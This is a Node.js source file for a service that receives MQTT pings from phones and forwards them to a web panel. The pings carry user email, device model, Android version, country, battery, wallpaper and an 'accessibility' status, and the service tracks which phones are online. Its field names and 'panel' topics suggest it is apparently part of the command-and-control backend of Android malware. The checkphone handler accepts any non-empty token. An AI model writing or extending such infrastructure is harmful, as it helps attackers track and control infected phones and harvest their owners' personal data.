const crypto = require('crypto');
const mqtt = require('mqtt');
const { getRedisConfig, initRedisBus, publishEvent } = require('./redis-bus');

const MQTT_ENABLE = /^(1|true|yes)$/i.test(process.env.MQTT_ENABLE || '');
const MQTT_URL = process.env.MQTT_URL || 'mqtt://mqtt:1883';
const MQTT_USERNAME = process.env.MQTT_USERNAME || '';
const MQTT_PASSWORD = process.env.MQTT_PASSWORD || '';
const MQTT_TOPIC_PREFIX = String(process.env.MQTT_TOPIC_PREFIX || 'eaod').replace(/\/+$/, '');
const SESSION_TTL_SEC = Math.max(30, Number(process.env.MQTT_SESSION_TTL_SEC || 120));
const redisConfig = getRedisConfig();

if (!MQTT_ENABLE) {
  process.exit(0);
}

initRedisBus().catch(() => {});

function parsePayload(payload) {
  const text = Buffer.isBuffer(payload) ? payload.toString('utf8') : String(payload || '');
  try {
    return JSON.parse(text);
  } catch {
    const params = new URLSearchParams(text);
    const obj = {};
    for (const [key, value] of params.entries()) obj[key] = value;
    return obj;
  }
}

function safeString(value) {
  return value === undefined || value === null ? '' : String(value).trim();
}

async function claimProtocolSession(phoneId, protocol, version, meta = null) {
  const endpoint = (process.env.APP_URL || 'http://nginx').replace(/\/$/, '') + '/api/protocol_session.php';
  try {
    await fetch(endpoint, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ phoneId, protocol, version, ttlSec: SESSION_TTL_SEC, meta }),
    });
  } catch (e) {
    console.warn('[MQTT] session claim failed:', e && e.message ? e.message : e);
  }
}

const client = mqtt.connect(MQTT_URL, {
  username: MQTT_USERNAME || undefined,
  password: MQTT_PASSWORD || undefined,
  reconnectPeriod: 5000,
  keepalive: 60,
});

client.on('connect', () => {
  client.subscribe(`${MQTT_TOPIC_PREFIX}/device/+/ping`);
  client.subscribe(`${MQTT_TOPIC_PREFIX}/device/+/close`);
  console.log('[MQTT] connected:', MQTT_URL);
  if (redisConfig.enabled) {
    console.log('[MQTT] redis bus enabled:', redisConfig.url);
  }
});

client.on('message', async (topic, payload) => {
  const parts = topic.split('/');
  const kind = parts[1];
  const phoneId = safeString(parts[2]);
  const action = parts[3];
  const data = parsePayload(payload);

  if (!phoneId) return;

  if (kind === 'device' && action === 'ping') {
    const body = {
      user_email: data.user_email || data.mail || '',
      phone_id: data.phone_id || phoneId,
      phone_name: data.phone_name || '',
      android_version: data.android_version || data.android_ver || '',
      model: data.model || '',
      install_date: data.install_date || '',
      country: data.country || '',
      wallpap: data.wallpap || data.wallpaper || '',
      battery_charge: data.battery_charge || data.battery_charg || '',
      activz: data.activz || '',
      accessibility: data.accessibility || '',
      via: 'mqtt'
    };

    try {
      await claimProtocolSession(phoneId, 'mqtt', data.version || data.app_version || '1', { clientType: 'phone' });
      await publishEvent('device:event', {
        source: 'mqtt',
        type: 'device.ping',
        phoneId,
        payload: body,
        receivedAt: Date.now(),
      });
      await fetch((process.env.APP_URL || 'http://nginx').replace(/\/$/, '') + '/api/Ping.php', {
        method: 'POST',
        headers: { 'content-type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams(body).toString(),
      });
      client.publish(`${MQTT_TOPIC_PREFIX}/device/${phoneId}/status`, JSON.stringify({ ok: true, ts: Date.now() }), { retain: true });
    } catch (e) {
      console.warn('[MQTT] ping forward failed:', e && e.message ? e.message : e);
    }
  }

  if (kind === 'device' && action === 'close') {
    await claimProtocolSession(phoneId, 'mqtt-close', '1', { clientType: 'phone' });
    await publishEvent('device:event', {
      source: 'mqtt',
      type: 'device.close',
      phoneId,
      payload: data,
      receivedAt: Date.now(),
    });
    client.publish(`${MQTT_TOPIC_PREFIX}/device/${phoneId}/status`, JSON.stringify({ ok: false, ts: Date.now() }), { retain: true });
  }

  if (kind === 'panel' && action === 'checkphone') {
    const token = safeString(data.token);
    const email = safeString(data.email);
    if (!email) return;

    const digest = crypto.createHash('sha256').update(`${email}:${token}:${Date.now() / 60000 | 0}`).digest('hex');
    client.publish(`${MQTT_TOPIC_PREFIX}/panel/${phoneId}/checkphone/ack`, JSON.stringify({ email, ok: !!token, sig: digest, ts: Date.now() }), { retain: false });
  }
});

client.on('error', (err) => {
  console.warn('[MQTT] error:', err && err.message ? err.message : err);
});